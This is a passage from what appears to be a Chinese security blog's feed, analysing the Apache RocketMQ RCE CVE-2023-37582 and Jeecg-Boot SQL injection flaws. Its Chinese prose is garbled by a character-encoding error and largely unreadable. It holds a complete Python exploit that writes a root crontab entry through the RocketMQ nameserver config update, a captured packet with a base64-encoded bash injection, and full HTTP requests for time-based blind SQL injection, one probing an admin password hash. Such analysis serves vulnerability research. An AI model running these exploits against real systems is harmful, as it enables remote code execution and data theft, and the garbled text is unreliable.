class="link" href="https://github.com/apache/rocketmq/commit/fb1c67d536c95ec7bd5904e61b9d97c4c2ee5a3d">https://github.com/apache/rocketmq/commit/fb1c67d536c95ec7bd5904e61b9d97c4c2ee5a3d<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/diff.png" class><p>å¾ˆç®€å•çš„ diffï¼Œåªæ˜¯æŠŠ <code>configStorePathName</code> æ”¹æˆäº† <code>configStorePath</code></p><p>ä¸Šä¸€æ¬¡åœ¨åˆ†æ CVE-2023-33246 çš„æ—¶å€™ï¼Œæˆ‘æŠ“è¿‡ä¸€ä¸ªæµé‡åŒ…ï¼Œå…¶ä¸­çš„å†…å®¹å°±æ˜¯åœ¨ CVE-2023-33246 ä¸­çš„ rocketmq åè®®ã€‚</p><p>æ‹¿å…¶ä¸­çš„ä¸€æ®µ TCP æµé‡å‡ºæ¥è¯´</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/TCP.png" class><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">25</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">401</span><span class="punctuation">&#125;</span>filterServerNums=<span class="number">1</span></span><br><span class="line">rocketmqHome=-c <span class="punctuation">&#123;</span>echo<span class="punctuation">,</span>dG91Y2ggL3RtcC9mbGFn<span class="punctuation">&#125;</span>|<span class="punctuation">&#123;</span>base64<span class="punctuation">,</span>-d<span class="punctuation">&#125;</span>|bash -c</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">435</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">401</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;extFields&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;\&quot;counter\&quot;:1,\&quot;stateVersion\&quot;:0,\&quot;timestamp\&quot;:1689312950437&#125;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">435</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶ï¼Œç›®å‰æå–å‡ºæ¥çš„éƒ¨åˆ†åº”è¯¥æ˜¯ TCP è¯·æ±‚ä¸­çš„ä¸€æ®µå‚æ•°ï¼Œä¸‹ä¸ªæ–­ç‚¹åˆ†æä¸€ä¸‹è¿™ä¸€æ®µé€šä¿¡è¿‡ç¨‹</p><h3 id="é€šä¿¡è¿‡ç¨‹åˆ†æ"><a href="#é€šä¿¡è¿‡ç¨‹åˆ†æ" class="headerlink" title="é€šä¿¡è¿‡ç¨‹åˆ†æ"></a>é€šä¿¡è¿‡ç¨‹åˆ†æ</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...c..._<span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">435</span><span class="punctuation">&#125;</span>...d...</span><br></pre></td></tr></table></figure><p>åè®®ä¸»è¦åŒ…å«å››éƒ¨åˆ†  åè®®æ€»é•¿åº¦+ json é•¿åº¦+ json + bodyï¼Œå‰åä¸¤æ®µçš„ cã€d å¯¹åº”çš„æ˜¯ ascii ç </p><p>åœ¨è¿™ä¸€æ®µ json æ•°æ®åŒ…å½“ä¸­ï¼Œæ¯”è¾ƒå¼•äººæ³¨ç›®çš„æ˜¯ <code>&quot;code&quot;:25</code>ï¼Œä¸åŒçš„ code ä»£è¡¨äº†ä¸åŒçš„ä¸šåŠ¡ï¼Œæ ¹æ®æ•°æ®åŒ…å½“ä¸­çš„ code å­—æ®µï¼Œç¨‹åºä¼šè¿›è¡Œä¸åŒçš„ä¸šåŠ¡å¤„ç†ï¼Œå¤„ç†ä¸šåŠ¡åœ¨ <code>org.apache.rocketmq.broker.processor.AdminBrokerProcessor#processRequest</code> æ–¹æ³•ä¸­</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/RequestCodeStatus.png" class><p>å…¶ä¸­ä»£ç å— <code>case RequestCode.UPDATEE_BROKER_CONFIG</code> æåˆ°ä¸€ä¸ªç±» <code>RequestCode</code>ï¼Œåç»­ä¼šç”¨åˆ°</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/RequestCode.png" class><p>è·Ÿè¿› <code>this.updateBrokerConfig()</code> æ–¹æ³•ï¼Œæ–¹æ³•ä¸­å…ˆå°† body å­—æ®µçš„å€¼æå–å‡ºæ¥ï¼Œå°è£…è¿› <code>Properties</code> ç±»å½“ä¸­ï¼Œå°è£…å®Œçš„ç»“æœå¦‚å›¾</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/properties.png" class><p>å¾€ä¸‹ï¼Œè·Ÿè¿› <code>this.brokerController.getConfiguration().update()</code> æ–¹æ³•ï¼Œåˆ°ç¬¬ 187 è¡Œï¼Œå¾ªç¯éå†æ‰€æœ‰çš„é…ç½®ï¼Œå¹¶æ ¹æ®å¯¹åº”ç±»ï¼Œæ›´æ–°é…ç½®</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/configObject.png" class><p>å¯ä»¥çœ‹åˆ°ï¼Œç»è¿‡è¿™ä¸€æ­¥ä¹‹åï¼Œé‡Œé¢çš„å€¼å·²ç»æ˜¯è¢«æ›´æ–°äº†</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/update.png" class><p>ç¨‹åºæ¥ç€è°ƒç”¨ <code>persist()</code> æ–¹æ³•ï¼Œ <code>persist()</code> æ–¹æ³•åšçš„ä¸šåŠ¡å…¶å®æ˜¯å°† <code>configObjectList</code> å†™å…¥è¿›å¯¹åº”çš„é…ç½®æ–‡ä»¶å½“ä¸­ã€‚</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/persist.png" class><p>å¾ˆæ¸…æ™°çš„æ˜¯ï¼Œç¨‹åºä¼šå°†é…ç½®å†™å…¥åˆ°ä¸¤ä¸ªæ–‡ä»¶ä¸­ï¼Œåˆ†åˆ«æ˜¯ <code>filename</code> å’Œ <code>filename.bak</code>ï¼Œå…¶ä¸­ <code>filename</code> çš„å€¼å¯¹åº”çš„æ˜¯ <code>configStorePath</code>ï¼Œä¹Ÿæ˜¯ CVE-2023-33246 çš„é»‘åå•å­—æ®µ</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/string2file.png" class><p>åœ¨æ•´æ®µç¨‹åºæ‰§è¡Œç»“æŸåå¯ä»¥å‘ç° <code>../conf/broker.conf</code> çš„å†…å®¹æ”¹å˜äº†ï¼Œä¸” rocketHome å·²ç»è¢«ä¿®æ”¹ä¸ºäº†æˆ‘ä»¬çš„è¾“å…¥</p><h3 id="æ„é€ -EXP"><a href="#æ„é€ -EXP" class="headerlink" title="æ„é€  EXP"></a>æ„é€  EXP</h3><p>æ—¢ç„¶å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ä¸å†™å…¥ï¼Œæ ¹æ®æ¼æ´æè¿°ï¼Œä¿®æ”¹å­˜å‚¨è·¯å¾„ä¸ºè®¡åˆ’ä»»åŠ¡è·¯å¾„å†™å…¥ crontab é€ æˆ RCE å³å¯ï¼Œå› ä¸ºè¦å†™å…¥ crontabï¼Œæ‰€ä»¥æ¶‰åŠåˆ°æƒé™é—®é¢˜ï¼Œå…¶ä¸­åˆå§‹åŒ–çš„ kvConfigPathã€configStorePath å¸¦æœ‰å½“å‰ç”¨æˆ·ï¼Œè€Œ kvConfigPath å¤„äºé»‘åå•ä¸­ï¼ŒconfigStorePath è¿˜æœªè¢«è¿‡æ»¤</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/NamesrvConfig.png" class><p>ä¸”æ”»å‡»ç›®æ ‡ä¸º namesrvï¼Œ<code>brokerConfigPath</code> æ˜¯ç”¨äºå­˜å‚¨ broker ç»„ä»¶å¯¹åº”çš„é…ç½®æ–‡ä»¶çš„ï¼Œåœ¨ V 5.1.1 å½“ä¸­ï¼Œ<code>brokerConfigPath</code> æ˜¯ broker ç»„ä»¶çš„é»‘åå•</p><p>è‡³æ­¤å°±å¯ä»¥æ„é€ å‡º EXP æ¥å†™å…¥å®šæ—¶ä»»åŠ¡ RCE</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">client = socket.socket()</span><br><span class="line"><span class="comment"># you ip</span></span><br><span class="line">client.connect((<span class="string">&#x27;124.222.21.138&#x27;</span>,<span class="number">9876</span>))</span><br><span class="line"><span class="comment"># data</span></span><br><span class="line">json = <span class="string">&#x27;&#123;&quot;code&quot;:318,&quot;extFields&quot;:&#123;&quot;test&quot;:&quot;RockedtMQ&quot;&#125;,&quot;flag&quot;:0,&quot;language&quot;:&quot;JAVA&quot;,&quot;opaque&quot;:266,&quot;serializeTypeCurrentRPC&quot;:&quot;JSON&quot;,&quot;version&quot;:435&#125;&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">body=<span class="string">&#x27;configStorePath=/var/spool/cron/crontabs/root\nbrokerConfigPath=/var/spool/cron/crontabs/root\nbindAddress=0.0.0.0\\n*/1 * * * * touch /tmp/success&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">json_lens = <span class="built_in">int</span>(<span class="built_in">len</span>(binascii.hexlify(json).decode(<span class="string">&#x27;utf-8&#x27;</span>))/<span class="number">2</span>)</span><br><span class="line">head1 = <span class="string">&#x27;00000000&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(json_lens))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(head1)</span><br><span class="line">all_lens = <span class="built_in">int</span>(<span class="number">4</span>+<span class="built_in">len</span>(binascii.hexlify(body).decode(<span class="string">&#x27;utf-8&#x27;</span>))/<span class="number">2</span>+json_lens)</span><br><span class="line">head2 = <span class="string">&#x27;00000000&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(all_lens))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(head2)</span><br><span class="line">data = head2[-<span class="number">8</span>:]+head1[-<span class="number">8</span>:]+binascii.hexlify(json).decode(<span class="string">&#x27;utf-8&#x27;</span>)+binascii.hexlify(body).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># send</span></span><br><span class="line">client.send(<span class="built_in">bytes</span>.fromhex(data))</span><br><span class="line">data_recv = client.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(data_recv)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">CVE-2023-37582 æ¼æ´åˆ†æ</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jeecg-Boot éƒ¨åˆ†å†å²æ¼æ´åˆ†æ</title>
    <link href="https://drun1baby.github.io/2023/10/19/Jeecg-Boot-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/10/19/Jeecg-Boot-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-10-19T08:18:28.000Z</published>
    <updated>2023-10-19T08:20:10.235Z</updated>
    
    <content type="html"><![CDATA[<p>Jeecg-Boot éƒ¨åˆ†å†å²æ¼æ´åˆ†æ</p><span id="more"></span><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æˆ‘å¸çš„ä»»åŠ¡ï¼ŒåŸæœ¬æ˜¯æ¼æ´æŒ–æ˜ï¼Œåœ¨æ¼æ´æŒ–æ˜ä¹‹å‰æ‰“ç®—å…ˆçœ‹çœ‹å†å²æ¼æ´ï¼Œç®€å•åˆ†æä¸€ä¸‹ã€‚<br>æœ¬æ–‡åªèšç„¦ä¸ Jeecg-Boot ç›¸å…³çš„ä¸€äº›æ¼æ´ï¼Œä¸€äº›ç»„ä»¶æ¼æ´æš‚æ—¶ä¸å…³æ³¨ã€‚</p><p>å„ä¸ªç‰ˆæœ¬çš„æ¼æ´åˆé›†</p><p><a class="link" href="https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E&t=blog&u=zhangdaiscott&s=new">https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E&amp;t=blog&amp;u=zhangdaiscott&amp;s=new<i class="fas fa-external-link-alt"></i></a></p><p>å› ä¸ºä¸»è¦ç ”ç©¶ç‰ˆæœ¬æ˜¯ä» Jeecg-Boot 3.0 å¼€å§‹çš„ï¼Œæ‰€ä»¥ 2.x.x çš„ç‰ˆæœ¬æ¼æ´å°±æš‚æ—¶ä¸åˆ†æäº†ã€‚ä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯ 3.2.0 çš„ç‰ˆæœ¬ï¼Œç›¸å¯¹æ¥è¯´éå¸¸ç¨³å®šã€‚</p><p>JeecgBootå¸¸è§é—®é¢˜å¤§å…¨ <a class="link" href="http://bbs.jeecg.com/forum.php?mod=viewthread&tid=7816&extra=page=1">http://bbs.jeecg.com/forum.php?mod=viewthread&amp;tid=7816&amp;extra=page%3D1<i class="fas fa-external-link-alt"></i></a></p><h2 id="CVE-2022-45206-Jeecg-Boot-lt-x3D-3-2-0-ç‰ˆæœ¬å­˜åœ¨-SQL-æ³¨å…¥æ¼æ´"><a href="#CVE-2022-45206-Jeecg-Boot-lt-x3D-3-2-0-ç‰ˆæœ¬å­˜åœ¨-SQL-æ³¨å…¥æ¼æ´" class="headerlink" title="CVE-2022-45206 Jeecg-Boot &lt;&#x3D; 3.2.0 ç‰ˆæœ¬å­˜åœ¨ SQL æ³¨å…¥æ¼æ´"></a>CVE-2022-45206 Jeecg-Boot &lt;&#x3D; 3.2.0 ç‰ˆæœ¬å­˜åœ¨ SQL æ³¨å…¥æ¼æ´</h2><p>3.0.0 &lt;&#x3D; Jeecg-Boot &lt;&#x3D; 3.2.0 ç‰ˆæœ¬å­˜åœ¨ SQL æ³¨å…¥æ¼æ´</p><h3 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p><code>Jeecg-Boot</code> åå°æœåŠ¡ API æ¥å£æ–‡æ¡£å¤„å­˜åœ¨ SQL æ³¨å…¥ï¼Œæ¼æ´å¯¹åº”æ¥å£ä¸º <code>/sys/duplicate/check</code></p><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/duplicate/check?dataId=%27aa2000&amp;fieldName=updatexml(1%2C(select%2F**%2Fif(length(%22aaa%22)%3E5%2C1%2Csleep(5))%20union%20select%2F**%2F1)%2C1)&amp;fieldVal=1000&amp;tableName=sys_log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">knife4j-gateway-code</span><span class="punctuation">: </span>ROOT</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æ¥å£ <code>org.jeecg.modules.system.controller.DuplicateCheckController</code> å…¨æµç¨‹æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯ç»è¿‡ä¸€ä¸²è¿‡æ»¤ï¼Œæœ€åæ‰§è¡Œ SQL è¯­å¥ï¼Œå¯¹åº”çš„ SQL è¯­å¥ä¸º</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- é‡å¤æ ¡éªŒ sqlè¯­å¥ --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;duplicateCheckCountSql&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Long&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;org.jeecg.modules.system.model.DuplicateCheckVo&quot;</span>&gt;</span>  </span><br><span class="line">    SELECT COUNT(*) FROM $&#123;tableName&#125; WHERE $&#123;fieldName&#125; = #&#123;fieldVal&#125; and id <span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span> #&#123;dataId&#125;  </span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">&lt;!-- é‡å¤æ ¡éªŒ sqlè¯­å¥ --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;duplicateCheckCountSqlNoDataId&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Long&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;org.jeecg.modules.system.model.DuplicateCheckVo&quot;</span>&gt;</span>  </span><br><span class="line">    SELECT COUNT(*) FROM $&#123;tableName&#125; WHERE $&#123;fieldName&#125; = #&#123;fieldVal&#125;<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æŒ‰ç…§æ­£å¸¸æ¥è¯´çš„ SQL æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where updatexml(1,(select/**/if(length(&quot;aaa&quot;)&gt;5,1,sleep(5)) union select/**/1),1);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>tableName</code> å¥‘åˆæ³¨å…¥ç‚¹æ”»å‡»å³å¯ã€‚æ¼æ´çš„æœ¬è´¨åŸå› æ˜¯è¿‡æ»¤çš„ä¸å®Œå…¨ã€‚</p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„è¿‡æ»¤ä¸º <code>select </code>ï¼Œå¤šäº†ä¸ªç©ºæ ¼ï¼Œå¾ˆå®¹æ˜“ä½¿ç”¨ <code>/**/</code> è¿›è¡Œç»•è¿‡ã€‚</p><p>ä½œè€…æå‡ºçš„ <code>replace()</code> æ›¿æ¢ <code>/**/</code> ä¹Ÿæ˜¯ä¿®å¤ä¸å®Œå…¨çš„ï¼Œå› ä¸ºä»æ—§å¯ä»¥ç”¨ <code>()</code> è¿›è¡Œç»•è¿‡</p><h3 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/f18ced524c9ec13e876bfb74785a1b112cc8b6bb">https://github.com/jeecgboot/jeecg-boot/commit/f18ced524c9ec13e876bfb74785a1b112cc8b6bb<i class="fas fa-external-link-alt"></i></a></p><p>åŠ äº†ä¸¤ä¸ªæŠ¥é”™æ³¨å…¥çš„å…³é”®å­—ï¼Œå¾ˆæ˜æ˜¾ä¿®å¤æ˜¯ä¸å®Œå…¨çš„ï¼Œä¾æ—§å­˜åœ¨å®‰å…¨éšæ‚£ã€‚åé¢è¦çœ‹çš„ jeecg-boot 3.4.4 å­˜åœ¨ sql æ³¨å…¥æ¼æ´å°±æ˜¯å¦‚æ­¤ï¼›ä½†æ˜¯ 3.4.4 çš„æ¼æ´å¤ç°æˆ‘å¤±è´¥äº†ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ã€‚</p><h2 id="Jeecg-Boot-lt-x3D-3-4-4-å­˜åœ¨-SQL-æ³¨å…¥æ¼æ´"><a href="#Jeecg-Boot-lt-x3D-3-4-4-å­˜åœ¨-SQL-æ³¨å…¥æ¼æ´" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.4.4 å­˜åœ¨ SQL æ³¨å…¥æ¼æ´"></a>Jeecg-Boot &lt;&#x3D; 3.4.4 å­˜åœ¨ SQL æ³¨å…¥æ¼æ´</h2><ul><li>å’Œä¸Šä¸€æ¡å…¶å®æ˜¯ç±»ä¼¼çš„</li></ul><h3 id="æ¼æ´æè¿°-1"><a href="#æ¼æ´æè¿°-1" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p>jeecg-boot3.4.4 å­˜åœ¨ sql æ³¨å…¥æ¼æ´ï¼Œsql æ³¨å…¥æ£€æµ‹ä»£ç å­˜åœ¨ç»•è¿‡ã€‚æ¥å£ä¸º <code>/sys/duplicate/check</code></p><h3 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/duplicate/check?dataId=2000&amp;fieldName=(select(if(((select%0Apassword%0Afrom%0Asys_user%0Awhere%0Ausername%0A=&#x27;jeecg&#x27;)=&#x27;eee378a1258530cb&#x27;),sleep(4),1)))&amp;fieldVal=1000&amp;tableName=test_person</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œçš„ sleep æ—¶é—´å–å†³äºæ•°æ®è¡¨é‡Œé¢æ”¾çš„æ•°æ®å¤šå°‘ï¼Œä¸º <code>n*æ—¶é—´</code></p><h3 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«éœ€è¦åˆ†æçš„ï¼Œç®€å•çš„ bypass</p><h3 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a">https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a<i class="fas fa-external-link-alt"></i></a></p><p>å¢æ·»çš„é»‘åå•æ˜¯ <code>geohash|gtid_subset|gtid_subtract</code>ï¼Œæ²¡çœ‹æ‡‚</p><h2 id="Jeecg-Boot-lt-x3D-3-4-4-å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´"><a href="#Jeecg-Boot-lt-x3D-3-4-4-å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.4.4 å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´"></a>Jeecg-Boot &lt;&#x3D; 3.4.4 å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´</h2><h3 id="æ¼æ´æè¿°-2"><a href="#æ¼æ´æè¿°-2" 